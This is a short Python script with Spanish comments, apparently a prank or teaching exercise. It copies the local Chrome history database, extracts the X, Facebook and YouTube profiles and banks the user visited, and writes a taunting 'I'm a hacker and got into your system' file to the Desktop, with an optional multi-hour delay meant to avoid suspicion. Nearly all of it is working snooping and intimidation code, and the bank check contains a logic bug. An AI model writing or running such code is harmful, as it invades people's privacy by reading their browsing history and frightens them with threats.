import os
import re
import sqlite3
from shutil import copyfile
from time import sleep
from random import randrange

HACKER_FILE_NAME = "PARA TI.txt"
user_path = os.path.expanduser("~")
chrome_history_path = os.path.join(user_path, ".config/google-chrome/Default/History")

def delay_action():
    n_hours = randrange(1, 4)
    sleep(n_hours * 3600)


def create_hacker_file():
    desktop_path = os.path.join(os.getenv("HOME"), "Desktop")
    archivo_path = os.path.join(desktop_path, HACKER_FILE_NAME)
    hacker_file = open(archivo_path, "w")
    hacker_file.write("Hola, soy un hacker y me he colado en tu sistema.\n")
    return hacker_file


def get_chrome_history():
    urls = None
    while not urls:
        try:
            temp_history = chrome_history_path + "temp"
            copyfile(chrome_history_path, temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            sleep(3)


def check_x_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_x_visited = []
    for item in chrome_history:
        results = re.findall("https://x.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_x_visited.append(results[0])
    if profiles_x_visited:
        hacker_file.write("He visto que has estado husmeando en los perfiles de {}\n".format(", ".join(profiles_x_visited)))


def check_facebook_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_facebook_visited = []
    for item in chrome_history:
       results = re.findall("https://www.facebook.com/([A-Za-z0-9.]+)$", item[2])
       if results and results[0] not in ["notifications", "home"]:
           profiles_facebook_visited.append(results[0])
    if profiles_facebook_visited:
        hacker_file.write("He visto que has estado husmeando en los perfiles de {}\n".format(", ".join(profiles_facebook_visited)))


def check_youtube_channels(hacker_file, chrome_history):
    youtube_channels = []
    for item in chrome_history:
        results = re.findall("https://www.youtube.com/(@[A-Za-z0-9.]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            youtube_channels.append(results[0])
    if youtube_channels:
        hacker_file.write("Veo que has visto los siguientes canales de YouTube: {}\n".format(", ".join(youtube_channels)))


def check_bank_account(hacker_file, chrome_history):
    his_bank = None
    banks = ["Banco Popular", "First Bank", "Scotiabank", "Oriental Bank"]
    for item in chrome_history:
        for bank in banks:
            if bank.lower() in item[0].lower():
                his_bank = bank
                break
            if his_bank:
                hacker_file.write("\n\nAdemás veo que guardas el dinero en {}... Interesante...\n".format(his_bank))
                break


def main():
    # Esperaremos entre 1 y 3 horas para no levantar sospechas
    # delay_action()
    # Recogemos el historial
    chrome_history = get_chrome_history()
    # Creamos archivo
    hacker_file = create_hacker_file()
    # Escribiendo mensajes de miedo
    check_facebook_profiles_and_scare_user(hacker_file, chrome_history)
    check_x_profiles_and_scare_user(hacker_file, chrome_history)
    check_youtube_channels(hacker_file, chrome_history)
    check_bank_account(hacker_file, chrome_history)


if __name__ == "__main__":
    main()